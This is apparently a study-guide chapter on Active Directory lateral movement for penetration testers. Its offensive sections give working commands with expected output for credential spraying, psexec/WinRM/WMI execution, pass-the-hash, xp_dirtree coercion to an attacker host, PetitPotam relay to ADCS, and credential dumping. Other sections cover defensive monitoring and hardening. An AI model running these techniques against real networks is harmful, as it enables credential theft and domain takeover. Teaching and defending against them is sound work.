## 1. Overview

Lateral movement in Active Directory is the phase where the attacker
moves from one compromised host or identity to another, building toward
Tier 0 (Domain Controllers). AD offers many remote execution primitives
by design; the art is choosing the one that fits the credentials
available, the target's defenses, and the noise budget.

**What lateral movement answers:**

- Given a credential (password, hash, ticket, certificate), which hosts
  can I authenticate to?
- Given a compromised host, which sessions and credentials can I harvest?
- Given a target host, which protocol gives me code execution?
- Given a network position, which traffic can I relay or coerce?

**Preconditions at a glance:**

| Technique | Requires | Yields |
|-----------|----------|--------|
| WinRM | Credential + Remote Management Users | Interactive shell |
| SMB / PsExec | Credential + local admin | SYSTEM shell |
| WMI | Credential + local admin | Command execution |
| DCOM | Credential + local admin | Command execution |
| RDP | Credential + Remote Desktop Users | Interactive desktop |
| Scheduled Tasks | Credential + local admin | Persistence + execution |
| SCM | Credential + local admin | Service creation (SYSTEM) |
| MSSQL | Credential + db_owner or sysadmin | Command execution via xp_cmdshell |
| Pass-the-Hash | NTLM hash | Network logon |
| Pass-the-Ticket | Kerberos ticket | Network logon |

**Credential sources on a compromised host:**

- LSASS memory (Mimikatz `sekurlsa::logonpasswords`) - cleartext where
  WDigest is enabled, NTLM hashes always, Kerberos tickets for active
  sessions.
- SAM database (`reg save HKLM\SAM` / `secretsdump -sam`) - local accounts.
- LSA secrets (`secretsdump -security`) - service account passwords,
  cached domain credentials (DCC2).
- DPAPI blobs (`sekurlsa::dpapi`) - browser passwords, Credential Manager.
- Scheduled tasks with stored credentials.
- `unattend.xml`, `sysprep.inf`, `web.config`, `*.config` files.
- GPP cpassword (see 04 Credential Abuse).
- Kerberos ticket cache (`klist`, `Rubeus dump`, `tickey`).

## 2. Reconnaissance / Enumeration

**Offensive - find hosts where the credential works:**

    # netexec: spray a credential across a subnet
    netexec smb 10.10.10.0/24 -u USER -p PASS
    netexec smb 10.10.10.0/24 -u USER -H <NTLM_HASH>
    netexec winrm 10.10.10.0/24 -u USER -p PASS

    # Find local admin rights (Pwn3d! marker)
    netexec smb 10.10.10.0/24 -u USER -p PASS | grep Pwn3d

    # BloodHound: which computers does the user have admin on?
    # Query: "Find Computers where Domain Users are Local Admin"

**Offensive - find active sessions on a host:**

    # netexec: logged-on users
    netexec smb 10.10.10.10 -u USER -p PASS --loggedon-users

    # PowerView (from a Windows host)
    Get-NetSession -ComputerName SRV01
    Get-NetLoggedon -ComputerName SRV01

    # net session (from the target, if you have a shell)
    net session

    # quser / query user
    quser /server:SRV01

**Offensive - find admin sessions to harvest:**

    # BloodHound: "Find Computers with sessions of Domain Admins"
    # Mark a compromised host as owned; BloodHound shows which DA
    # sessions are reachable from it.

    # SharpHound session collection (loud)
    SharpHound.exe -c Session,LoggedOn

**Offensive - find remote execution primitives:**

    # Which ports are open?
    netexec smb 10.10.10.10
    nmap -p 135,139,445,5985,5986,3389,1433,1521 10.10.10.10

    # SMB signing status (relay target?)
    netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

    # WinRM enabled?
    netexec winrm 10.10.10.10 -u USER -p PASS

**Defensive - what to monitor:**

- 4624 Logon Type 3 (network) and Type 10 (RemoteInteractive) from
  unusual sources.
- 4648 (explicit credential logon) - PsExec, runas, scheduled tasks.
- 4688 process creation with `psexec`, `wmic`, `powershell -enc`.
- 5140 / 5145 (network share access) to ADMIN$, C$, IPC$.
- 7045 (service installed) - PsExec, SCM abuse.
- 4697 (service installed via API).
- WinRM 91 / 168 events (shell creation).

## 3. Common Attack Vectors

**SMB / PsExec family:**

- `psexec.py` (Impacket) - uploads a service binary, creates a service,
  runs as SYSTEM. Loud: creates a service, writes to ADMIN$.
- `smbexec.py` - creates a service that runs cmd.exe with a redirect;
  less noisy than psexec but still creates a service.
- `atexec.py` - creates a scheduled task; runs as SYSTEM.
- `wmiexec.py` - WMI execution; no service, no file on disk; runs as
  the authenticated user (not SYSTEM).

**WinRM family:**

- `evil-winrm` - interactive PowerShell over WinRM.
- `netexec winrm -x` - one-shot command.
- `Enter-PSSession` / `Invoke-Command` - native PowerShell remoting.
- Requires the user to be in `Remote Management Users` or `Administrators`.

**WMI family:**

- `wmiexec.py` - semi-interactive shell; runs as the authenticated user.
- `Invoke-WmiMethod` / `Invoke-CimMethod` - native WMI execution.
- No service created; less noisy than PsExec.

**DCOM family:**

- `dcomexec.py` - uses MMC20.Application, ShellWindows, or ShellBrowserWindow.
- `Invoke-DCOM` (PowerShell) - native DCOM execution.
- No service created; runs as the authenticated user.

**RDP family:**

- `xfreerdp` - interactive desktop.
- `rdesktop` - older client.
- Pass-the-Hash works with Restricted Admin mode (`/restricted-admin`).
- RDP requires the user to be in `Remote Desktop Users` or `Administrators`.

**Scheduled Tasks:**

- `atexec.py` - creates a task via ATSVC.
- `schtasks /create /s TARGET /ru SYSTEM /tr cmd.exe /tn taskname` - native.
- Runs as SYSTEM if `/ru SYSTEM` is specified and the caller is admin.

**Service Control Manager (SCM):**

- Direct SCM abuse with `sc.exe` or Impacket's `smbexec` internals.
- Creates a service pointing to a binary; runs as SYSTEM.

**MSSQL:**

- `xp_cmdshell` - command execution as the SQL service account.
- `sp_OACreate` - OLE automation; alternative when xp_cmdshell is disabled.
- `xp_dirtree` / `xp_fileexist` - UNC path coercion (capture NetNTLMv2).
- `sqlcmd` / `mssqlclient.py` - interactive client.

**Pass-the-Hash / Pass-the-Ticket:**

- See 03 Authentication Attacks for details.
- PtH is the standard technique after DCSync.

**Coercion + relay:**

- PetitPotam, PrinterBug, DFSCoerce - coerce a DC to authenticate to
  an attacker-controlled host.
- Combine with ntlmrelayx to relay to LDAP or ADCS (ESC8).

## 4. Exploitation Recipes

**PsExec (Impacket):**

    psexec.py corp.local/Administrator:<PASSWORD>@10.10.10.10

    # Expected output:
    # [*] Requesting shares on 10.10.10.10.....
    # [*] Found writable share ADMIN$
    # [*] Uploading file ...
    # [*] Opening SVCManager on 10.10.10.10.....
    # [*] Creating service ...
    # [*] Starting service ...
    # Microsoft Windows [Version 10.0.17763.3650]
    # (c) 2018 Microsoft Corporation. All rights reserved.
    # C:\Windows\system32>whoami
    # nt authority\system

**WMIExec (Impacket) - less noisy, no service:**

    wmiexec.py corp.local/user:password@10.10.10.10

    # Expected output:
    # Impacket v0.11.0 - Copyright 2023 Fortra
    # [*] SMBv3.0 dialect used
    # [!] Launching semi-interactive shell - Careful what you execute
    # [!] Press help for extra shell commands
    # C:\>whoami
    # corp\user

**WinRM (evil-winrm):**

    evil-winrm -i 10.10.10.10 -u user -p password

    # Expected output:
    # Info: Establishing connection to remote endpoint
    # *Evil-WinRM* PS C:\Users\user\Documents> whoami
    # corp\user

**WinRM with Pass-the-Hash:**

    evil-winrm -i 10.10.10.10 -u Administrator -H <NTLM_HASH>

    # Expected output:
    # Info: Establishing connection to remote endpoint
    # *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
    # corp\administrator

**Scheduled task (atexec):**

    atexec.py corp.local/Administrator:<PASSWORD>@10.10.10.10 "whoami"

    # Expected output:
    # [*] Creating task \whoami
    # [*] Running task \whoami
    # [*] Got output:
    # nt authority\system

**MSSQL xp_cmdshell:**

    # Connect with mssqlclient
    mssqlclient.py corp.local/svc_sql:<PASSWORD>@10.10.10.10 -windows-auth

    # Enable xp_cmdshell
    SQL> EXEC sp_configure 'show advanced options', 1;
    SQL> RECONFIGURE;
    SQL> EXEC sp_configure 'xp_cmdshell', 1;
    SQL> RECONFIGURE;

    # Execute a command
    SQL> EXEC xp_cmdshell 'whoami';

    # Expected output:
    # output
    # ----------------------------------------------------------------
    # corp\svc_sql

**MSSQL UNC coercion (capture NetNTLMv2):**

    # Terminal 1: Responder or ntlmrelayx
    responder -I eth0 -wv

    # Terminal 2: trigger UNC path
    SQL> EXEC xp_dirtree '\\10.10.14.5\share';

    # Expected output in Responder:
    # [SMB] NTLMv2-SSP Hash     : svc_sql::CORP:...

**Pass-the-Hash with netexec (spray):**

    netexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH>

    # Expected output:
    # SMB  10.10.10.10  445  DC01  [+] CORP\Administrator <NTLM_HASH> (Pwn3d!)
    # SMB  10.10.10.11  445  SRV01 [+] CORP\Administrator <NTLM_HASH> (Pwn3d!)

**Coercion (PetitPotam) + relay to ADCS (ESC8):**

    # Terminal 1: ntlmrelayx targeting the CA's HTTP endpoint
    ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
      -smb2support --adcs --template DomainController

    # Terminal 2: coerce the DC to authenticate
    PetitPotam.py -d corp.local -u USER -p PASS 10.10.14.5 10.10.10.10

    # Expected output in ntlmrelayx:
    # [*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
    # [*] GOT CERTIFICATE! ID 0x...
    # [*] Writing PKCS#12 certificate to ./DC01.pfx

**Pass-the-Ticket with Rubeus (Windows):**

    Rubeus.exe ptt /ticket:<base64_ticket>

    # Expected output:
    # [*] Action: Import Ticket
    # [+] Ticket successfully imported!
    # [*] Enumerating Kerberos tickets on the host...
    # (0) ... krbtgt/CORP.LOCAL ...

    # Use the ticket
    dir \\dc01.corp.local\c$

## 5. Post-Exploitation

**On each new host:**

- Dump LSASS (`sekurlsa::logonpasswords`) - harvest cleartext and hashes.
- Dump SAM + LSA secrets (`secretsdump.py -sam -security`) - local
  accounts, cached domain credentials.
- Check for active sessions of higher-privileged users.
- Look for stored credentials (`unattend.xml`, `*.config`, scripts).
- Check scheduled tasks with stored credentials.
- Check for ADCS certificates in the user's store (`certutil -store My`).

**Re-enumeration loop:**

- Mark the new host/user as owned in BloodHound.
- Re-run "Shortest Paths from Owned Principals".
- Check for new ACL edges unlocked by the new identity.
- Check for new sessions on the new host.

**Persistence on a host:**

- Scheduled task running as SYSTEM.
- Service running a payload.
- WMI event subscription.
- Registry Run key.
- Startup folder (if the user logs in).

**Persistence in the domain:**

- Golden Ticket (KRBTGT hash).
- Silver Ticket (service account hash).
- AdminSDHolder ACL backdoor.
- SID History injection.
- DCSync rights granted to a controlled account.

## 6. Risk Context

Lateral movement is where a single compromised host becomes a domain
compromise:

- A single LSASS dump often yields credentials for dozens of hosts.
- A single local admin hash often works on many hosts (password reuse).
- A single DA session on a compromised host yields DA credentials.
- Coercion + relay turns any Windows host into a pivot.

**Blast radius:** a single compromised workstation with a DA logged on
is equivalent to a domain compromise. A single local admin hash reused
across the fleet is equivalent to a fleet compromise.

**Why attacks succeed:**

- Password reuse across local admin accounts.
- Local admin on all workstations (legacy "IT admin" model).
- DA logons on member servers (should never happen in a tiered model).
- NTLM enabled (allows PtH).
- SMB signing disabled (allows relay).
- No monitoring of 4624 / 4648 / 7045 events.

## 7. Root Causes

- **Password reuse.** Local admin password the same across the fleet
  (pre-LAPS).
- **DA logons on member servers.** Should never happen; common in flat
  networks.
- **NTLM enabled.** Backward compatibility.
- **SMB signing disabled.** Default on older systems.
- **No tiered administration.** Tier 0 credentials touch Tier 2 hosts.
- **No monitoring of logon events.** Lateral movement is invisible.
- **No credential rotation after compromise.** Hashes remain valid.
- **Legacy protocols.** WDigest enabled (cleartext in LSASS), SMBv1,
  unsigned LDAP.

## 8. Preventive Controls

**Stop credential exposure:**

- Tiered administration model (Tier 0 / 1 / 2).
- PAWs (Privileged Access Workstations) for Tier 0.
- No DA logons on member servers or workstations.
- Protected Users group for all Tier 0 accounts.
- Credential Guard on Windows 10/11 and Server 2016+.
- Disable WDigest (`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0`).
- LAPS for local admin passwords (unique per host).
- Disable NTLM where possible.
- Enforce SMB signing and LDAP signing.

**Stop lateral movement primitives:**

- Disable WinRM where not needed (or restrict to admins).
- Disable RDP where not needed (or restrict via firewall).
- Disable SMBv1.
- Restrict SMB (445) and RPC (135) via host firewall between tiers.
- Restrict WMI and DCOM to admins.
- Disable the Print Spooler on DCs (blocks PrinterBug).
- Disable WebDAV (blocks some coercion vectors).
- Patch against PetitPotam / DFSCoerce / PrinterBug.

**Monitor lateral movement:**

- Enable advanced audit: 4624 (logon), 4648 (explicit credential), 4688
  (process creation), 5140 / 5145 (share access), 7045 (service install).
- Baseline normal lateral movement (SCCM, backup, monitoring).
- Alert on 4648 from unexpected sources.
- Alert on 7045 with suspicious service names.

## 9. Detection Controls

**PsExec / SMBExec / AtExec:**

- Event 7045 (service installed) with a random service name and a
  binary in `C:\Windows\` or `ADMIN$`.
- Event 4697 (service installed via API).
- Event 5140 / 5145 (share access) to `ADMIN$` or `C$`.
- Event 4688 with `psexesvc.exe`, `psexec.c`, or `smbexec`.

**WinRM:**

- Event 91 (WinRM shell created) on the target.
- Event 168 (WinRM shell closed).
- Event 4624 with `Logon Type 3` and `Logon Process = WinRM`.
- Event 4688 with `wsmprovhost.exe`.

**WMI:**

- Event 4688 with `WmiPrvSE.exe` spawning a child process.
- Event 5861 (WMI permanent event subscription).
- Event 1 (Sysmon) with `WmiPrvSE.exe` parent.

**DCOM:**

- Event 4688 with `mmc.exe`, `dllhost.exe`, or `explorer.exe` spawning
  a suspicious child.
- Sysmon event 3 (network connection) from `dllhost.exe`.

**Scheduled Tasks:**

- Event 4698 (scheduled task created).
- Event 4702 (scheduled task updated).
- Event 106 (TaskScheduler operational) - task registered.

**RDP:**

- Event 4624 with `Logon Type 10` (RemoteInteractive).
- Event 4778 / 4779 (session reconnect / disconnect).
- Event 1149 (RDP authentication succeeded, TerminalServices).

**Pass-the-Hash:**

- Event 4624 with `Logon Type 3` and `Authentication Package = NTLM`.
- Event 4776 with NTLM credential validation from unexpected source.
- Event 4672 (special privileges) for non-admin users.

**Pass-the-Ticket:**

- Event 4769 with a TGS requested by a user with no prior TGT.
- Event 4769 with an anomalous `Client Address`.

**Coercion + relay:**

- Event 4624 on the attacker host with the DC machine account.
- Event 5145 (network share access) to IPC$ from a DC machine account.
- Event 4768 / 4769 with the DC machine account authenticating to
  unexpected services.

## 10. Verification

**Offensive - did lateral movement succeed?**

- PsExec: shell as `nt authority\system` on the target.
- WMIExec: shell as the authenticated user on the target.
- WinRM: interactive PowerShell as the authenticated user.
- Scheduled task: command output returned.
- Pass-the-Hash: `Pwn3d!` in netexec; validate with a command.
- Coercion + relay: certificate obtained; authenticate with it.

**Defensive - are controls effective?**

- Test PsExec: 7045 event generated; alert fires.
- Test WinRM: 91 event generated; alert fires.
- Test PtH: Protected Users blocks it for Tier 0; Credential Guard
  blocks it for protected hosts.
- Test relay: SMB signing enforced; relay fails.
- Test coercion: PetitPotam patched; WebDAV disabled; Print Spooler
  disabled on DCs.

## 11. OSCP Notes

- OSCP AD machines usually require 1-3 lateral movement hops before
  reaching Tier 0. The common chain: foothold -> user -> local admin ->
  DA -> DC.
- Essential tools: `psexec.py`, `wmiexec.py`, `evil-winrm`, `netexec`,
  `atexec.py`, `secretsdump.py`.
- **Capture screenshots** of:
  - The first remote shell on a new host (with `whoami` output).
  - The `Pwn3d!` marker in netexec (proof of local admin).
  - The PtH command and its output.
  - The session harvesting (`--loggedon-users`).
- The `> [!IMPORTANT]` OSCP reporting note applies to the initial
  foothold on each new host and to the privilege escalation step.

## 12. Production Notes

- PsExec is extremely noisy: 7045, 5140, 5145 events fire in seconds;
  EDR flags it immediately. In mature environments, use WMIExec or
  WinRM (quieter) or fall back to native tools.
- WinRM is legitimate in many environments (SCCM, Ansible); baseline
  and alert on unusual sources.
- PtH is detectable via 4624 with NTLM but is often hidden in normal
  traffic.
- Coercion + relay is the modern attack chain in mature environments
  (PetitPotam, ESC8); patch and disable legacy features.
- Assume compromise: after any lateral movement in production, rotate
  all credentials the attacker may have harvested.

## 13. References

**Microsoft documentation:**

- [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
- [Remote Desktop Services](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-rds)
- [SMB signing overview](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview)
- [Tiered administration model](https://learn.microsoft.com/en-us/security/compass/privileged-access-access-model)

**MITRE ATT&CK:**

- [Lateral Movement - Remote Services (T1021)](https://attack.mitre.org/techniques/T1021/)
- [Lateral Movement - SMB/Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002/)
- [Lateral Movement - Windows Remote Management (T1021.006)](https://attack.mitre.org/techniques/T1021/006/)
- [Execution - Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053/)

**Tools:**

- [Impacket](https://github.com/fortra/impacket) - psexec, wmiexec, smbexec, atexec, dcomexec, secretsdump
- [netexec](https://github.com/Pennyw0rth/NetExec) - SMB/WinRM/LDAP/MSSQL
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) - WinRM shell
- [Responder](https://github.com/lgandx/Responder) - LLMNR/NBT-NS/mDNS poisoning
- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) - NTLM relay
- [PetitPotam](https://github.com/topotam/PetitPotam) - coercion
- [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos toolkit

**Research:**

- [ADSecurity.org - PsExec detection](https://adsecurity.org/?p=177)
- [SpecterOps - lateral movement](https://posts.specterops.io/)
- [The Hacker Recipes - lateral movement](https://www.thehacker.recipes/ad/movement/lateral-movement)